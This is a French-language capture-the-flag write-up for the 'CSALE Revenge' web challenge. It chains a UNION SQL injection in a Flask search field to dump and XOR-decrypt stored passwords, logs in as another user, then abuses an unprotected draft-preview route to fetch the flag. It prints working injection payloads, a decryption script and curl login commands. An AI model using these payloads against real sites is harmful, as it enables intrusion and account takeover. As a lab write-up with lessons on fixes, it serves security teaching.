+++
draft = false
title = 'CSALE Revenge'
category = 'Web'
+++

> The one that was originally meant to be deployed...`

<!--more-->

**Flag :** `csaw{Th4t3_R0ugH_Bud1y}`

**Stack :** Flask + gunicorn, **deux** bases SQLite : `database.db` (publique) et `private.db` (drafts + seller_release). Source fournie (`main.py`, `vault.py`, templates).

**TL;DR :** version **durcie** de CSALE. Le login-SQLi est corrige et le PIN 4 chiffres est remplace par un release-password aleatoire incassable — **mais** la SQL injection dans la recherche et une route de previsualisation de draft **sans controle d'acces** sont restees. On dump les mots de passe via la SQLi, on se connecte en tant que le proprietaire du flag-draft, on lit son **slug**, puis `GET /<slug>/preview` sert l'image du flag **sans jamais demander le release password**.

---

## 1. Reconnaissance 

**A. SQL injection dans la recherche `q`** (l.185-200) — DB publique :
```python
query = request.args.get("q", "")          # aucun filtre
sql = base + " WHERE ((l.title||' '||l.description||' '||u.username) LIKE '%" + query + "%')" + " ORDER BY l.id DESC"
listings = conn.execute(sql).fetchall()    # concatenation, pas de parametre
```
UNION injectable, **7 colonnes**, breakout `%')`. `conn.execute` n'autorise qu'une seule requete (pas de `;` empiles en python-sqlite3) — pas de `ATTACH`, on ne lit que `database.db`.

**B. IDOR sur `/<slug>/preview`** (l.403-408) :
```python
@app.route("/<slug>/preview")
@login_required
def draft_preview(slug):
    draft = get_draft(slug)
    path = draft_file(draft) if draft else None
    return send_file(path) if path else abort(404)
```
**Aucune verification de proprietaire ni de release password.** `draft_file` cherche l'image dans `PRIVATE_LISTING_IMAGE_DIR` et sert `flag.png` du draft. Le seul secret est le **slug**.

---

## 2. Exploitation

### 2.1 Signup et decouverte de la surface d'attaque

La recherche est protegee par `@login_required`, donc on commence par creer un compte (inscription ouverte).

![Signup — creation du compte JackOrion](images/Screenshot%202026-09-19%20123326.png)

Une fois connecte, on tombe sur le marketplace avec toutes les annonces. Un test rapide avec `' OR '1' = '1` dans la barre de recherche confirme que le champ n'est pas filtre.

![Marketplace — test initial de la recherche avec une injection basique](images/Screenshot%202026-09-19%20123345.png)

### 2.2 SQLi UNION — confirmation et enumeration

sqlmap se faisait **throttler** par l'instance (connection timed out / dropping suspicious requests) — on fait a la main, une requete a la fois.

On confirme d'abord l'injection UNION avec 7 colonnes. Le breakout est `%')` pour fermer le `LIKE` :
```
q = zz%') UNION SELECT 999,'JACKJACK',(SELECT sqlite_version()),0,'','',''-- -
```

Le resultat affiche `JACKJACK` en titre et `3.46.1` en description dans la carte. L'injection fonctionne.

![Confirmation de la SQLi UNION — JACKJACK et la version SQLite 3.46.1 apparaissent dans les resultats](images/Screenshot%202026-09-19%20125040.png)

Vue dans Burp Suite avec le detail de la requete et la reponse HTML :

![Burp Suite — requete SQLi UNION et reponse montrant JACKJACK + sqlite_version](images/Screenshot%202026-09-19%20125059.png)

### 2.3 Dump de la cle XOR (table `password_notes`)

La table `password_notes` contient la cle de dechiffrement du vault, decoupee en phases :
```
q = zz%') UNION SELECT 999,(SELECT group_concat(phase||'='||key_piece) FROM password_notes),'x',0,'','',''-- -
```

![Burp Suite — dump de password_notes : les fragments de la cle XOR (3=7491,1=9820,5=9317,2=3324,4=7000)](images/Screenshot%202026-09-19%20125551.png)

Resultat : `3=7491,1=9820,5=9317,2=3324,4=7000`

Tries par phase : **`98203324749170009317`**

### 2.4 Dump du vault (table `password_vault` + `users`)

On dump ensuite les mots de passe chiffres avec les noms d'utilisateurs :
```
q = zz%') UNION SELECT 999,(SELECT group_concat('['||u.username||'='||pv.encrypted_password||']','') FROM password_vault pv JOIN users u ON u.id=pv.user_id),'x',0,'','',''-- -
```

![Burp Suite — dump du password_vault avec les encrypted_password bruts par user_id](images/Screenshot%202026-09-19%20125617.png)

En reformatant la requete pour joindre les usernames directement :

![Burp Suite — dump formate [username=encrypted_password] pour tous les utilisateurs](images/Screenshot%202026-09-19%20130006.png)

### 2.5 Dechiffrement XOR (logique `vault.py`)

Le fichier `vault.py` revele que les mots de passe sont chiffres par un simple XOR repete avec la cle :

```python
import re
key = b"98203324749170009317"
blob = "[superdiscreteflaguser=49594143445c405006060a][Walter_W=7015737d6c7b777d64717773626277777c61]..."
for user, h in re.findall(r"\[([^=]+)=([0-9a-f]+)\]", blob):
    p = bytes(b ^ key[i % len(key)] for i, b in enumerate(bytes.fromhex(h)))
    print(f"{user:<24} {p.decode(errors='replace')}")
```

| User | Mot de passe |
|------|--------------|
| superdiscreteflaguser | password123 |
| Walter_W | I-AM_HEISENBURGGER |
| Mr.Krabs | MONEYYYYYYYYYYYY |
| Gojo | Can't_touch_thisfrfr |
| Daenerys | stormborn_targaryan |
| Zoro | NEEDMOREPAINT |
| OSIRIS | enjoy_the_ctf_good_luck! |
| Maliketh | OdeathBecOMEMyBladEONceMOre |
| **Zuko** | **i-HaVe-REgaINEd_mY_h0NOr!** |

### 2.6 Trouver le slug — login sur chaque compte

Le slug du flag-draft n'est **pas** dans la DB publique — il est seulement visible par le proprietaire, sur sa page `/account/drafts`. En se connectant sur chaque compte, le flag-draft se trouve sur **Zuko** :

```bash
curl -s -c c.txt --data-urlencode "username=Zuko" --data-urlencode "password=i-HaVe-REgaINEd_mY_h0NOr!" http://<IP>:5000/login
curl -s -b c.txt http://<IP>:5000/account/drafts | grep -oE "/[A-Za-z0-9_-]+/preview"
```

![Page drafts de Zuko — le draft "Recovered photo proof" avec la miniature du flag](images/Screenshot%202026-09-19%20130536.png)

Draft **"Recovered photo proof"**, slug = **`recovered-photo-proof`**.

Le slug est lisible/devinable, et comme `/<slug>/preview` n'a aucun controle d'acces, **n'importe quel compte connaissant ce slug** recupere l'image — sans etre Zuko et sans release password.

### 2.7 Le flag

```
GET /recovered-photo-proof/preview
```

L'IDOR sur la route de previsualisation sert directement l'image sans verifier le proprietaire ni le release password :

![flag.png — l'image servie par /recovered-photo-proof/preview contenant le flag](images/Screenshot%202026-09-19%20130541.png)

```
csaw{Th4t3_R0ugH_Bud1y}
```

---

## Resume de la chaine

1. **Signup** d'un compte — la recherche est `@login_required`.
2. **SQLi UNION** sur le parametre `q` (breakout `%')`, 7 colonnes, DB publique) — dump de `password_notes` + `password_vault`.
3. **Cle XOR** = `key_piece` tries par `phase` = `98203324749170009317` — dechiffrement de tous les mots de passe.
4. **Login Zuko** (`i-HaVe-REgaINEd_mY_h0NOr!`) — `/account/drafts` revele le slug `recovered-photo-proof`.
5. **`GET /recovered-photo-proof/preview`** (IDOR, aucun release password requis) — `flag.png` est servi directement.

## Lecons

- Un correctif partiel ne suffit pas : ils ont blinde le *login* et le *unlock*, mais la **recherche** est restee injectable et la **previsualisation** ouverte a tous.
- **Separer les donnees sensibles n'aide pas si un chemin d'acces les sert sans controle** : `private.db` etait inaccessible via la SQLi, mais `/<slug>/preview` servait l'image sans verifier ni proprietaire ni mot de passe.
- Un **slug lisible** (`recovered-photo-proof`) n'est pas un secret : combine a l'absence de controle d'acces, il est devinable.
